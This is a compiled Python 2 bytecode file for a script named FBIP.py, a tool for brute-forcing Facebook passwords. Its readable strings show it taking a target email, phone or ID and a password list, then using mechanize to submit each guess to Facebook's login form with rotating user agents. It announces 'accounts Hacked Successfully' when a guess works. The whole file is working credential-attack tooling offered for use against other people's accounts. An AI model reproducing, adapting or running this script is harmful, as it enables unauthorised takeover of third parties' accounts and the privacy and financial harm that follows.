ó
÷Ïâ[c           @   sû   d  Z  d Z d Z d Z d Z d Z d Z d d l Z d d l Z d d l	 Z	 d d l
 Z
 d d l Z e GHd	 GHe GHd
 GHe GHd Z e GHe e d   Z e e d   Z d Z d g Z d   Z d   Z d   Z d   Z e d k r÷ e   n  d S(   s
   [1;31;40ms
   [1;32;40ms
   [1;33;40ms
   [1;34;40ms
   [1;35;40ms
   [1;36;40ms
   [1;37;40miÿÿÿÿNsË   
 		==================================
		=           			 =
                =				 =
                ="=====> Hello My Friends <====="=
		=				 =
		=				 =
		==================================
            s&   [1;37;40m=========  welcom  =========s  
                      .~      ,   . ~.
                     /                                    /      /~\/~\   ,                     |   .   \    /   '   |
                   |         \/         |
          XX       |  /~~\        /~~\  |       XX
        XX  X      | |  o  \    /  o  | |      X  XX
      XX     X     |  \____/    \____/  |     X     XX
 XXXXX     XX      \         /\        ,/      XX     XXXXX
X        XX%;;@      \      /  \     ,/      @%%;XX        X
X       X  @%%;;@     |           '  |     @%%;;@  X       X
X      X     @%%;;@   |. ` ; ; ; ;  ,|   @%%;;@     X      X
 X    X        @%%;;@                  @%%;;@        X    X
  X   X          @%%;;@              @%%;;@          X   X
   X  X            @%%;;@          @%%;;@            X  X
    XX X             @%%;;@      @%%;;@             X XX
      XXX              @%%;;@  @%%;;@              XXX
                         @%%;;%%;;@
                           @%%;;@
                         @%%;;@..@@
                          @@@  @@
			s   Email or Phone or ID : s   [1;31;40mEnter PassList : s   https://www.facebook.comsD   Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0se   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1c          C   s   t  j   a t j   }  t j t  t j t  t j	 |   t j
 t  t j t  t j t  j j   d d t   t   t GHd GHd  S(   Nt   max_timei   s#   Password Not Found on the Pass List(   t	   mechanizet   Browsert   brt	   cookielibt   LWPCookieJart   set_handle_robotst   Falset   set_handle_redirectt   Truet   set_cookiejart   set_handle_equivt   set_handle_referert   set_handle_refresht   _httpt   HTTPRefreshProcessort   welcomet   searcht   B(   t   cj(    (    s(   /data/data/com.termux/files/home/FBIP.pyt   mainF   s    c         C   sv  t  j j d j |    t  j j   d t j t  f g t _	 t j
 t  } t j d d  t t j d <|  t j d <t j   } | j   } | t k rrd | k rrd d	 t d
 j |   GHd t d GHt d  } | d k s| d k s| d k s| d k s| d k r#t   qr| d k s_| d k s_| d k s_| d k s_| d k rrt j d  qrn  d  S(   Ns   [*] Pass ======>> {}
s
   User-agentt   nri    t   emailt   passt   login_attempts   [1;34;40mBgs   

[+] Email/Phone/ID : s    Password : ( {} )s   [1;36;40mBgs   [+] s     accounts Hacked Successfully!!!s    Do You want to exit? [y/n] t   yt   Yt   yest   YESt   Yest   nt   Nt   not   NOt   Nos   python2 FBIP.pys   [1;36;40mBg[+] (   t   syst   stdoutt   writet   formatt   flusht   randomt   choicet
   useragentsR   t
   addheaderst   opent   logint   select_formR   t   formt   submitt   geturlt	   raw_inputt   exitt   ost   system(   t   passwordt   sitet   subt   logt   m(    (    s(   /data/data/com.termux/files/home/FBIP.pyt   bruteU   s"    <
<c          C   s@   t  t d  }  x* |  D]" a t j d d  a t t  q Wd  S(   Nt   rs   
t    (   R,   t   passwordlistR6   t   replaceR;   (   t	   passwords(    (    s(   /data/data/com.termux/files/home/FBIP.pyR   g   s    c          C   sF   t  t d  }  |  j   }  Hd j t  GHd Gt |   Gd GHd GHd  S(   NR<   s    [*] Account  cracking  : {}s    [*] checking Pass :R@   s&    [*] hacing accounts please wait ...

(   R,   R>   t	   readlinesR&   R   t   len(   t   total(    (    s(   /data/data/com.termux/files/home/FBIP.pyR   o   s    t   __main__(   sD   Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0se   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1(   t   AR   t   Ct   Dt   Ft   Gt   HR4   R   R(   R#   R   t   azt   strR2   R   R>   R-   R*   R   R;   R   R   t   __name__(    (    (    s(   /data/data/com.termux/files/home/FBIP.pyt   <module>   s8   							